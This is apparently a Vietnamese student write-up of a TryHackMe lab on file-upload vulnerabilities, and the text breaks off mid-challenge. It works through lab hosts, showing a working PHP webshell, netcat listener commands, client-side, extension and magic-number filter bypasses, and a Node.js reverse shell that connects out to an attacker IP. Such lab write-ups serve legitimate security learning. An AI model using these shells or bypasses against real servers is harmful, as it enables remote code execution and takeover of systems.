# Upload Vulnerabilities

***Task 1: Getting Started***

***Hosts file là gì?***

- ***Hosts file*** là một tệp trên máy tính dùng để ánh xạ (liên kết) tên miền (domain name) với địa chỉ IP cục bộ.

- Nó cho phép truy cập một trang web bằng tên miền mà không cần hỏi DNS server.

***Cách sử dụng Hosts file:***

- ***Bypass DNS***:

    - Thay vì hỏi DNS server để lấy địa chỉ IP của một trang web, có thể tự thiết lập ánh xạ trong Hosts file.

    - Ví dụ: có thể ánh xạ ***example.com*** đến địa chỉ IP ***192.168.1.100***.

- ***Hỗ trợ Virtual Hosting (Vhosting)***:

    - Virtual Hosting cho phép một web server phục vụ nhiều website khác nhau từ cùng một địa chỉ IP.

    - Hosts file giúp truy cập các website này bằng tên miền riêng biệt.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image119.png?raw=true)

=> Thêm dòng sau vào cuối file: 

***10.10.141.199    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm***

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image120.png?raw=true)

***Task 2: Introduction***

***Tải file lên server***:

- ***Tính năng tải file lên*** rất phổ biến trong các ứng dụng web, từ ảnh hồ sơ đến lưu trữ dự án.

- Tuy nhiên, nếu xử lý không tốt, nó có thể tạo ra các lỗ hổng nghiêm trọng.

***Rủi ro từ việc tải file lên***:

1. ***Ghi đè file hiện có***: Kẻ tấn công có thể thay thế file quan trọng trên server.

2. ***Tải lên và thực thi Shell***: Cho phép kẻ tấn công thực thi mã độc trên server.

3. ***Bypass Client-Side và Server-Side Filtering***: Vượt qua các biện pháp kiểm tra file.

4. ***Đánh lừa kiểm tra loại nội dung***: Tải lên file độc hại dưới dạng hợp lệ.

***Hậu quả***: 

- ***RCE (Remote Code Execution)***: Kẻ tấn công có thể kiểm soát server từ xa.

- ***Phá hoại nội dung***: Thay đổi hoặc xóa dữ liệu quan trọng.

- ***Lưu trữ và rò rỉ thông tin nhạy cảm***: Sử dụng server để lưu trữ dữ liệu bất hợp pháp.

***Task 3: General Methodology***

***Cách khai thác lỗ hổng tải file lên:***

1. ***Enumeration (Liệt kê)***:

- Kiểm tra source code của trang để phát hiện ***client-side filtering***.

- Sử dụng công cụ như ***Gobuster*** để quét và tìm thư mục upload.

- Dùng ***Burpsuite*** để chặn và phân tích yêu cầu tải lên.

- Sử dụng tiện ích như ***Wappalyser*** để thu thập thông tin nhanh về website.

2. ***Thử nghiệm:***

- Tìm hiểu cách website xử lý file tải lên.

- Nếu có ***client-side filtering***, xem code để tìm cách bypass.

- Nếu có ***server-side filtering***, thử upload file và dựa vào thông báo lỗi để điều chỉnh.

3. ***Công cụ hỗ trợ:***

- ***Burpsuite*** hoặc ***OWASP Zap*** để thử nghiệm và bypass các bộ lọc.

- Upload file được thiết kế để gây lỗi, giúp hiểu rõ hơn về cách hoạt động của bộ lọc.

***Task 4: Overwriting Existing Files***

***Ghi đè file hiện có trên server:***

- Khi tải file lên server, cần kiểm tra để tránh ghi đè lên file hiện có.

- ***Cách phòng ngừa***: 

    1. Đặt tên file mới (ngẫu nhiên hoặc thêm thời gian).

    2. Kiểm tra xem tên file đã tồn tại chưa.

    3. Cấp quyền truy cập file hợp lý (ví dụ: không cho phép ghi đè).

***Rủi ro nếu không phòng ngừa:***

- Kẻ tấn công có thể ghi đè file hiện có, gây phiền toái hoặc phá hoại.

- ***Hạn chế***: Quyền truy cập file thường ngăn chặn lỗ hổng nghiêm trọng, nhưng vẫn cần chú ý trong pentest hoặc bug hunting.

=> Ví dụ, có 1 trang web với form upload: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image121.png?raw=true)

=> Xem source page: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image122.png?raw=true)

=> Phát hiện đoạn code chịu trách nhiệm hiển thị hình ảnh trên page. Nó có nguồn từ 1 file tên là ***spaniel.jpg***, bên trong thư mục ***images***.

=> Đã biết được hình ảnh được lấy từ đâu, có thể ghi đè nó không?

Download 1 hình ảnh khác từ internet và đặt tên là ***spaniel.jpg***. Sau đó upload lên trang web và xem liệu có ghi đè được không.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image123.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image124.png?raw=true)

=> Ghi đè file ***images/spaniel.jpg*** thành công!

=> Điều hướng đến http://overwrite.uploadvulns.thm:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image125.png?raw=true)

=> Xem source page: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image126.png?raw=true)

=> Tìm được thư mục chứa hình ảnh trên trang web là ***/images***.

=> Thử tải lên 1 file img và thay tên thành ***mountains.jpg***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image127.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image128.png?raw=true)

=> Ghi đè file thành công!

***Task 5: Remote Code Execution***

***Remote Code Execution (RCE) qua lỗ hổng tải file lên:***

- ***RCE*** cho phép thực thi mã tùy ý trên server, dù với quyền hạn thấp, vẫn là lỗ hổng nghiêm trọng.

- ***Cách khai thác***: Tải lên file chứa mã độc (thường viết bằng ngôn ngữ back-end của server, như PHP, Python, hoặc Node.js).

- ***Khó khăn***: Trong ứng dụng định tuyến (routed), việc khai thác phức tạp hơn và ít khả thi hơn.

***2 cách đạt RCE***:

1. ***Webshell***:

- Tải lên file script (ví dụ: PHP) để thực thi lệnh qua giao diện web.

- Phù hợp khi bị giới hạn kích thước file hoặc firewall chặn kết nối mạng.

2. ***Reverse/Bind Shell***:

- Tạo kết nối từ server về máy của kẻ tấn công (reverse shell) hoặc mở cổng trên server để kết nối (bind shell).

- Là mục tiêu lý tưởng nhưng khó thực hiện hơn.

***Cách kích hoạt shell:***

- ***Truy cập trực tiếp***: Nếu server cho phép, điều hướng đến file đã tải lên.

- ***Buộc ứng dụng web chạy script***: Cần thiết trong ứng dụng định tuyến.

***Web shells:***

=> Giả sử trang web như sau: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image129.png?raw=true)

=> Bắt đầu với việc quét với ***gobuster***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image130.png?raw=true)

=> Tìm được 2 thư mục: ***/uploads*** và ***/assets***. Trong số này, có vẻ mọi file upload lên sẽ đặt trong thư mục ***uploads***. Trước tiên, thử upload hình ảnh hợp pháp:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image131.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image132.png?raw=true)

=> Upload thành công, truy cập thư mục ***/uploads*** kiểm tra xem file có được tải lên đây không: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image133.png?raw=true)

=> Upload thành công file ***spaniel.jpg***. 

=> Tiếp theo cần tạo và sử dụng Webshell:

Biết được web server sử dụng ngôn ngữ ***PHP***, trong thực tế cần tìm hiểu nhiều hơn để phát hiện ra ngôn ngữ lập trình mà web server sử dụng, nhưng ***PHP*** luôn là lựa chọn tốt để kiểm tra trước. 

- ***Mục tiêu***: Tạo một webshell đơn giản để thực thi lệnh hệ thống trên server thông qua trình duyệt.

- ***Cách hoạt động***: Webshell nhận một tham số từ URL và thực thi nó như một lệnh hệ thống.

***Code Webshell PHP:***

    <?php
        echo system($_GET["cmd"]);
    ?>

- ***Giải thích***: 

    - ***$_GET["cmd"]***: Lấy giá trị của tham số ***cmd*** từ URL.

    - ***system()***: Thực thi lệnh hệ thống.

    - ***echo***: Hiển thị kết quả lệnh trên màn hình.

=> ***Cách sử dụng***: 

1. ***Tải lên webshell***: Upload file PHP chứa đoạn code trên lên server.

2. ***Thực thi lệnh***: Truy cập URL với tham số ***cmd***, ví dụ:

    http://example.com/webshell.php?cmd=whoami

=> Lệnh ***whoami*** sẽ được thực thi và kết quả hiển thị trên trang web.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image134.png?raw=true)


***Reverse Shells***

Quá trình upload ***reverse shell*** gần giống upload ***webshell***. Sử dụng trình ***Pentest Monkey*** reverse shell, theo mặc dịnh trên Kali Linux. 

=> Sử dụng ***NetCat*** để lắng nghe kết nối: 

    nc -lvnp 1234

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image135.png?raw=true)

=> Tiếp theo upload shell và thực thi nó bằng cách điều hướng đến http://demo.uploadvulns.thm/uploads/shell.php

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image136.png?raw=true)

=> Điều hướng đến http://shell.uploadvulns.thm

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image137.png?raw=true)

=> Sử dụng tool ***Gobuster*** để tìm thư mục được dùng để lưu file upload: 

    gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image138.png?raw=true)

=> Thư mục ***/resources*** có thể được dùng để lưu trữ file tải lên. 

=> Tạo file ***shell.php*** với nội dung: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image139.png?raw=true)

=> Thử upload 1 file hình ảnh lên trang: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image140.png?raw=true)

=> Upload thành công. Truy cập thư mục ***/resources*** kiểm tra: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image141.png?raw=true)

=> Tìm được file ***mountains.jpg*** vừa upload.

=> Tiếp theo upload file ***shell.php*** vừa tạo:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image142.png?raw=true)

=> Upload thành công. 

=> Truy cập ***/resources/shell.php*** để thực thi shell và thêm tham số ***cmd=cd/var/www;ls;cat flag.txt*** để thực thi lệnh hệ thống: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image143.png?raw=true)

***Task 6: Filtering***

***Filtering trong Upload File:***

- ***Client-Side Filtering:***

- Chạy trên trình duyệt của người dùng, thường bằng JavaScript.

- Dễ bị bypass vì người dùng có thể can thiệp vào code.

- ***Server-Side Filtering:***

- Chạy trên server, khó bypass hơn vì không có quyền truy cập vào code.

- Đòi hỏi tạo payload phù hợp với filter để thực thi mã độc.

***Các loại Filtering phổ biến:***

1. ***Extension Validation***:

- ***Blacklist***: Chặn các extension cụ thể.

- ***Whitelist***: Chỉ cho phép các extension cụ thể.

2. ***File Type Filtering:***

- ***MIME Validation***: Kiểm tra MIME (Multipurpose Internet Mail Extension) type trong header (ví dụ: image/jpeg).

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image144.png?raw=true)

- ***Magic Number Validation***: Kiểm tra chuỗi byte đầu file để xác định loại file (ví dụ: ***89 50 4E 47*** cho PNG).

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image145.png?raw=true)

3. ***File Length Filtering:***

- Giới hạn kích thước file để tránh quá tải server.

- Ví dụ: Giới hạn 2KB, trong khi shell PHP cần 5.4KB.

4. ***File Name Filtering:***

- Đảm bảo tên file là duy nhất và không chứa ký tự đặc biệt (ví dụ: null byte, dấu gạch chéo).

5. ***File Content Filtering:***

- Quét toàn bộ nội dung file để đảm bảo không giả mạo extension, MIME type, hoặc magic number.


***Task 7: Bypassing Client-Side Filtering***

***Bypass Client-Side Filtering:***

- ***Client-Side Filtering***: Dễ bị bypass vì nó chạy trên trình duyệt của người dùng.

- ***4 cách bypass:***

    1. ***Tắt JavaScript***:

    - Tắt JavaScript trong trình duyệt.

    - Hiệu quả nếu website không yêu cầu JS để hoạt động cơ bản.

    2. ***Chặn và sửa đổi trang web***:

    - Sử dụng Burpsuite để chặn trang web và loại bỏ bộ lọc JS trước khi nó chạy.

    3. ***Chặn và sửa đổi file upload***: 

    - Cho phép trang web tải bình thường, nhưng chặn và sửa đổi quá trình upload file sau khi file đã được chấp nhận bởi bộ lọc.

    4. ***Gửi file trực tiếp đến điểm upload***:

    - Sử dụng công cụ như ***curl*** để gửi file trực tiếp mà không cần qua trang web có bộ lọc.

    - ***Cú pháp:***

            curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
    
    - ***Cách thực hiện***: Intercept một lần upload thành công để xem tham số được dùng, sau đó dùng tham số này trong lệnh ***curl***.

Giả sử, có 1 trang upload: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image146.png?raw=true)

=> Xem source page: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image147.png?raw=true)

=> Phát hiện 1 hàm JS cơ bản kiểm tra loại MIME của file upload. Trong trường hợp này, có thể thấy filter đang sử dụng ***whitelist*** để loại trừ mọi loại MIME không phải là ***images/jpeg***.

Bước tiếp theo, thử upload file, như dự đoán, nếu chọn upload file JPEG, website sẽ chấp nhận nó. Bất cứ upload gì khác đều bị từ chối.

Khởi động Burp Suite và Intercept khi refresh page. Click chuột phải vào ***intercepted data***, cuộn xuống ***“Do Intercept”***, chọn ***“Response to this request”***, để tránh response những request không liên quan:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image148.png?raw=true)

=> Forward request và response tương ứng sẽ hiển thị. Lúc này, có thể thao tác với response trước khi request tiếp theo được forward. 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image149.png?raw=true)

=> Xóa hàm JS, tiếp tục forward cho đến khi website load xong, bây giờ có thể upload bất cứ file nào lên web. 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image150.png?raw=true)

=> Sau khi thành công bypass bộ lọc, tiếp theo thử upload file có extension hợp pháp (ở đây là .jpeg) và MIME type hợp pháp, sau đó Intercept và sửa nội dung upload bằng Burp Suite. 

=> Sau khi load lại trang để đặt filter lại vị trí cũ, lấy shell đã tạo từ task trước và đổi tên thành ***“shell.jpg”***. Vì web tự động kiểm tra MIME type (dựa trên file extension) nên Client-Side filter cho phép payload được tải lên mà không có lỗi.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image151.png?raw=true)

=> Mở Burpsuite và Intercept Upload request:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image152.png?raw=true)

Quan sát thấy MIME type payload hiện tại là ***image/jpeg***. Thử thay đổi thành ***text/x-php***, và phần file extension từ ***.jpg*** thành ***.php***, sau đó forward request đến server: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image153.png?raw=true)

=> Tiếp theo, điều hướng đến http://demo.uploadvulns.thm/uploads/shell.php sau khi thiết lập kênh lắng nghe bằng ***NetCat***, sẽ nhận được kết nối từ shell: 

=> Điều hướng đến java.uploadvulns.thm: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image155.png?raw=true)

=> Xem source page và tìm được file ***Client-side-filter.js***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image156.png?raw=true)

=> Sử dụng ***gobuster*** để tìm kiếm thư mục nào sẽ chứa file upload: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image157.png?raw=true)

=> Thử truy cập thư mục ***/images***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image158.png?raw=true)

=> Là thư mục chứa file upload.

=> Upload file ***shell.php*** tạo từ task trước, tạm thời sửa extension file thành ***.png*** và đây là request bắt được khi upload file:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image159.png?raw=true)

=> Forward request này và xem response từ server: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image160.png?raw=true)

=> Upload file ***shell.png*** thành công. Bây giờ đổi lại file extension thành ***.php*** và MIME type thành ***text/x-php*** để có thể thực thi shell: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image161.png?raw=true)

=> Forward request:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image162.png?raw=true)

=> Forward request: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image163.png?raw=true)

=> Response thông báo upload thành công. Kiểm tra thư mục ***/images***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image164.png?raw=true)

=> Đã upload thành công file ***shell.php***. 

=> Chỉnh sửa url như task trước để xem nội dung file flag.txt:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image165.png?raw=true)

***Task 8: Bypassing Server-Side Filtering: File Extensions***

- ***Server-Side Filtering***: Khó bypass hơn client-side vì không thể xem hoặc sửa đổi code trực tiếp.

- ***Cách tiếp cận***: Thử nghiệm nhiều lần để hiểu filter và tạo payload phù hợp.

***Ví dụ về Blacklist Filter:***

- ***Code PHP***: 

        <?php
            $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
            switch($extension){
                case "php":
                case "phtml":
                case NULL:
                    $uploadFail = True;
                    break;
                default:
                    $uploadFail = False;
            }
        ?>

    - ***Cách hoạt động***: Lọc các file có extension ***.php*** và ***.phtml***.

***Cách Bypass:***

- ***Sử dụng các extension khác***:

    - Thử các extension PHP khác như .php3, .php4, .php5, .php7, .php-s, .pht, .phar.

    - Ví dụ: Đổi tên file từ ***shell.php*** thành ***shell.php5*** để vượt qua bộ lọc.

Nhưng có vẻ như server đã được định cấu hình để không nhận dạng chúng là tệp PHP, như VD dưới đây:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image166.png?raw=true)

=> Tuy nhiên, extension ***.phar*** lại có thể bypass filter:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image167.png?raw=true)

1 ví dụ khác, với 1 filter khác. Lần này sẽ làm nó hoàn toàn trong ***blackbox***; tức là không có source code. Một trang upload như sau:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image168.png?raw=true)

=> Thử upload 1 file hợp lệ, như file ***spaniel.jpg***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image169.png?raw=true)

=> Server chấp nhận file ***.jpg***. Thử upload 1 file ***shell.php***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image170.png?raw=true)

Trong VD trước, code sử dụng hàm ***pathinfo()*** PHP để lấy 1 vài ký tự sau dấu “.”, nhưng điều gì sẽ xảy ra nếu filter input hơi khác 1 chút.

=> Thử upload 1 file có dạng ***shell.jpg.php***. Đã biết các file JPEG được chấp nhận, vậy điều gì sẽ xảy ra nếu filter chỉ kiểm tra xem phần extension ***.jpg*** có nằm ở đâu đó trong input hay không?

=> Upload file và nhận được thông báo success. Truy cập thư mục ***/uploads*** , xác nhận payload ***shell.jpg.php*** đã được upload thành công:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image171.png?raw=true)

=> Thực thi file thành công: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image172.png?raw=true)

=> Điều hướng đến: annex.uploadvulns.thm

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image173.png?raw=true)

=> Thử dùng gobuster để tìm thư mục chứa file upload:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image174.png?raw=true)

=> Thử truy cập thư mục ***/privacy***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image175.png?raw=true)

=> Là thư mục chứa file upload. Thử upload file ***shell.php***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image176.png?raw=true)

=> Không thành công. Thử đổi tên file thành ***shell.png.php***, mục đích để kiểm tra xem có phải filter lọc tên file chỉ chứa ***.png*** là có thể bypass không? 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image177.png?raw=true)

=> Vẫn không upload được. Thử đổi tên file thành ***shell.png.php5*** và upload lại: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image178.png?raw=true)

=> Upload thành công. Truy cập thư mục ***/privacy*** để xác nhận: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image179.png?raw=true)

=> Đã upload payload thành công. Thực thi file như task trước: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image180.png?raw=true)

***Task 9: Bypassing Server-Side Filtering: Magic Numbers***

- ***Magic Numbers***: Là chuỗi hex ở đầu file, dùng để xác định loại file.

- ***Cách hoạt động***: Server đọc vài byte đầu file và so sánh với danh sách cho phép (whitelist) hoặc chặn (blacklist).

Ví dụ: 

- ***PNG file***: Magic number là ***89 50 4E 47 0D 0A 1A 0A***.

- ***JPEG file***: Magic number là ***FF D8 FF E0***.

***Cách Bypass:***

- ***Sửa đổi magic number***: Thêm magic number hợp lệ vào đầu file độc hại để vượt qua bộ lọc.

- ***Ví dụ***: Thêm magic number của PNG vào đầu file PHP để giả dạng file ảnh.

Ví dụ 1 trang upload: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image181.png?raw=true)

Như task trước, trang chỉ nhấp nhận file JPEG và từ chối file PHP. 

=> Ý tưởng bypass lần này là thêm ***Magic numbers*** tượng trưng cho file JPEG vào đầu file ***shell.php***. Giá trị đó là ****FF D8 FF DB***. 

=> Sử dụng lệnh ***file*** để kiểm tra type của file shell.php: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image182.png?raw=true)

Có thể thấy Magic number dài 4 byte, mở file shell và thêm ***AAAA*** vào đầu file: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image183.png?raw=true)

=> Mở file shell.php trong ***hexeditor***, cho phép xem và chỉnh sửa file dưới dạng hex: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image184.png?raw=true)

=> 41 ở đây là hex code cho chữ A, giống như những gì thêm vào đầu file. 

=> Đổi thành ***FF D8 FF DB***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image185.png?raw=true)

=> Lưu lại và dùng lệnh file kiểm tra lại 1 lần nữa: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image186.png?raw=true)

=> File đã chuyển thành kiểu JPEG. Thử upload file: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image187.png?raw=true)

=> Upload thành công payload.

=> Điều hướng đến http://magic.uploadvulns.thm/

=> Thử upload file ***.png***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image188.png?raw=true)

=> Thông báo lỗi ***GIFs only please!***.

=> Kiểm tra file type của ***shell.php***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image189.png?raw=true)

=> Đang là file .php. Thử thêm ****AAAA*** vào đầu file và xem nội dung dưới dạng hex: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image190.png?raw=true)

=> Đổi 4 byte đầu tiên thành giá trị Magic numbers của JPEG là ****FF D8 FF DB***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image191.png?raw=true)

=> Kiểm tra lại file type: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image192.png?raw=true)

=> Thêm ký tự ASCII đại diện cho file ***gif***: ***GIF87a*** vào đầu file shell.php:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image193.png?raw=true)

=> Kiểm tra lại file type:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image194.png?raw=true)

=> Upload lại file: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image195.png?raw=true)

=> Upload thành công. 

=> Dùng gobuster để xem file được upload lưu trữ ở thư mục nào:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image196.png?raw=true)

=> Thử truy cập thư mục ***/graphics*** và thành công thực thi shell: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image197.png?raw=true)

***Task 10: Example Methodology***

***Phương pháp khai thác lỗ hổng tải file lên:***

1. ***Khảo sát website:***

- Sử dụng công cụ như Wappalyzer hoặc Burp Suite để xác định ngôn ngữ và framework của web app.

- Tìm kiếm các trang upload file.

2. ***Kiểm tra trang upload:***

- Xem source code để phát hiện client-side filtering.

- Thử upload file hợp lệ và xác định cách truy cập file (ví dụ: trực tiếp trong thư mục upload hoặc nhúng vào trang).

3. ***Thử upload file độc hại:***

- Bypass client-side filter đã phát hiện.

- Nếu upload thất bại, xác định server-side filter:

    - ***Blacklist/Whitelist Extension***: Thử upload file với extension không hợp lệ.

    - ***Magic Number Filter***: Thay đổi magic number của file.

    - ***MIME Filter***: Thay đổi MIME type trong request.

    - ***File Length Filter***: Tăng dần kích thước file để xác định giới hạn.

***Task 11: Challenge***

Điều hướng đến jewel.uploadvulns.thm:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image198.png?raw=true)

=> Xem source page tìm kiếm clinet-filtering: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image199.png?raw=true)

=> Chưa tìm thấy gì. Xem nội dung file ***upload.js***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image200.png?raw=true)

=> Dùng gobuster tìm kiếm 1 lượt: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image201.png?raw=true)

=> Refresh page và Intercept request trong Burp Suite: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image202.png?raw=true)

=> Header ***X-Powered-By*** có giá trị là ***Express***, suy ra dấu hiệu server sử dụng ***node.js*** để build.

=> Tạo shell có dạng ***node.js***, truy cập https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md để lấy payload:

    (function(){

    var net = require("net"),

        cp = require("child_process"),

        sh = cp.spawn("/bin/sh", []);

    var client = new net.Socket();

    client.connect(4242, "10.0.0.1", function(){

        client.pipe(sh.stdin);

        sh.stdout.pipe(client);

        sh.stderr.pipe(client);

    });

    return /a/; // Prevents the Node.js application from crashing

    })();

=> Thay đổi port và IP:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image203.png?raw=true)

=> Thử upload file này:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image204.png?raw=true)

=> Có thể có client-filter. Intercept request truy cập file ***upload.js*** trong Burp Suite: 

